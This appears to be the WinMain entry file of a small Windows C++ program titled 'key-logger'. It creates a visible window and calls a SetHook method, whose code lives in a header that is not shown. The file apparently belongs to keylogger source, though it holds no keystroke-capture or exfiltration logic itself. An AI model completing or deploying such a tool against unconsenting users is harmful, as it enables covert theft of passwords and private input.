#include <Windows.h>
#include "Window.hpp"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    Window window(hInstance);
    int window_width = 320;
    int window_height = 240;
    window.Create(TEXT("key-logger"), window_width, window_height);
    window.Show(nCmdShow);
    window.SetHook();
    window.Update();
    MSG message = window.DestroyWin();
    return message.wParam;
}
